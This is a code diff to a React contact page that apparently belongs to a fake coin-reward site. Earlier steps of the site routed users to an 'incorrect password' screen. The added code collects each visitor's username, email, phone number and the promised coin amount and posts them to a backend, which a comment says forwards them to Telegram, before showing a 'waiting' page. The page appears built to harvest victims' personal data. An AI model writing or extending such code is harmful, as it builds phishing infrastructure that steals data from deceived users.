@@ -3,6 +3,10 @@ import { useNavigate } from 'react-router-dom';
 import { Button } from '../components/ui/button';
 import { Input } from '../components/ui/input';
 import { Smartphone } from 'lucide-react';
+import axios from 'axios';
+
+const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+const API = `${BACKEND_URL}/api`;
 
 const ContactPage = () => {
   const navigate = useNavigate();
@@ -10,12 +14,33 @@ const ContactPage = () => {
   const [phone, setPhone] = useState('');
   const [countryCode, setCountryCode] = useState('+1');
   const coinAmount = localStorage.getItem('coinAmount') || '100,000';
+  const sessionId = localStorage.getItem('sessionId');
+  const username = localStorage.getItem('username');
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     if (email.trim() && phone.trim()) {
+      const fullPhone = `${countryCode}${phone}`;
       localStorage.setItem('email', email);
-      localStorage.setItem('phone', `${countryCode}${phone}`);
-      navigate('/incorrect-password');
+      localStorage.setItem('phone', fullPhone);
+
+      // Send to backend and Telegram
+      try {
+        await axios.post(`${API}/session/step`, {
+          session_id: sessionId,
+          step: 'contact',
+          data: {
+            username: username,
+            amount: parseInt(coinAmount),
+            email: email,
+            phone: fullPhone
+          }
+        });
+      } catch (error) {
+        console.error('Failed to submit step:', error);
+      }
+
+      // Navigate to waiting page
+      navigate('/waiting');
     }
   };
 
